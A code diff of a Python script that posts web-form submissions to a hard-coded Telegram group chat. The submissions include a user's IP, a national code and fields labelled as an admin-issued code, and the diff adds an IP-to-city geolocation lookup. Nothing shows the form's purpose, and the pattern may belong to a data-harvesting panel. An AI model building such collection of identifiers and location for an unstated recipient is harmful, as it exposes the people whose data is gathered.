@@ -8,7 +8,7 @@ from random import choice
 import datetime
 
 DaysOfWeek = {
-    "Saturday":"شنبه","Sunday":"یکشنبه","Monday":"دوشنبه","Tuesday":"سه‌شنبه","Wednesday":"چهارشنبه","Thursday":"پنجشبه","Friday":"جمعه"
+    "Saturday":"شنبه","Sunday":"یکشنبه","Monday":"دوشنبه","Tuesday":"سه‌شنبه","Wednesday":"چهارشنبه","Thursday":"پنجشنبه","Friday":"جمعه"
 }
 Months = {
     "1":"فروردین","2":"اردیبهشت","3":"خرداد","4":"تیر","5":"مرداد","6":"شهریور","7":"مهر","8":"آبان","9":"آذر","10":"دی","11":"بهمن","12":"اسفند"
@@ -48,13 +48,19 @@ def SendMessageToTelegramIndirect(Message , ChatID) -> bool:
 def SendToTelegram(f1 , f2 , f3 , f4 , f5 , Scode , ip):
     try:
         chatid = "-1001946865397"
+        # chatid = "151372864"
         User = Db.GetUserByIP(ip)
         if User == None:
             User = Db.GetUserByScode(Scode)
         NCodeCount = Db.GetNationalSubmitted(f4)
+        try:
+            city = requests.get("http://ip-api.com/json/"+ip).json().get("city")
+        except:
+            city = "نامعلوم"
         message = f"""
         کاربر شماره: {User.get("ID")}
         آی پی: {ip}
+        شهر: {city}
         
         کد اشتراکی دریافتی از ادمین:
         {f1}
@@ -64,7 +70,7 @@ def SendToTelegram(f1 , f2 , f3 , f4 , f5 , Scode , ip):
         {f5}
         کد انتخاب شده:
         {f2}
-        تاریخ و زمان رسید:
+        محل سکونت (شهر):
         {f3}
         
         """
@@ -86,7 +92,6 @@ def SendToTelegram(f1 , f2 , f3 , f4 , f5 , Scode , ip):
         Month = Months.get(now.strftime("%m"))
         DayOfMonth = now.strftime("%d") 
         message += f"{time} {day} {DayOfMonth} {Month}"
-        # SendMessageToTelegramDirect(message , "151372864")
         while True:
             if SendMessageToTelegramDirect(message , chatid):
                 break
